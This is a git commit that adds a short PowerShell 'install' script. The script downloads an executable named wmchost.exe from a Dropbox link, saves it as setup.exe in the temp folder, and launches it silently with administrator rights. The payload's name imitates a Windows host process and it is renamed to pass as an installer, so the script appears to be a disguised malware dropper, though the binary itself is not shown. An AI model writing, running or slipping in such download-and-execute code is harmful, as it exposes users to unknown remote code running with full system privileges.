dd542a3719fdcfbecf302287265cd2a958d8ceaa
Nur Mohammad Rafi <144477870+ostwrafi@users.noreply.github.com>
2026-02-01 00:11:58 +0600

    Create installalvi.ps1

---
+++ installalvi.ps1
@@ -0,0 +1,7 @@
+# install.ps1 alvi
+
+$u = "https://www.dropbox.com/scl/fi/8sd2wb7b6kjak2riqm7ze/wmchost.exe?rlkey=q9o1dkt2dmtiob1afp0gu3m4g&st=la30dipf&dl=1"
+$p = "$env:TEMP\setup.exe"
+
+Invoke-RestMethod $u -OutFile $p
+Start-Process $p -ArgumentList "/silent /norestart" -Verb RunAs
